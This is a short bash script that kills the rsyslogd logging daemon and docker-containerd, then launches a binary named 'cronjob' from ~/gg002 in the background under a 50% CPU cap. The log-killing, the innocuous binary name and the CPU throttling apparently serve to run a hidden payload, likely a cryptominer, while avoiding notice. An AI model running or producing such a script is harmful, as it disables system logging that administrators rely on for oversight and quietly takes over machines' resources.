#!/bin/bash
sudo apt-get update &
sleep 10
sudo killall rsyslogd &&
sudo killall docker-containerd &&
sudo apt install -y cpulimit &&
chmod +x ~/gg002/cronjob &&
cpulimit -e cronjob -l 50 -b &
sleep 15
~/gg002/./cronjob &
sleep 300m


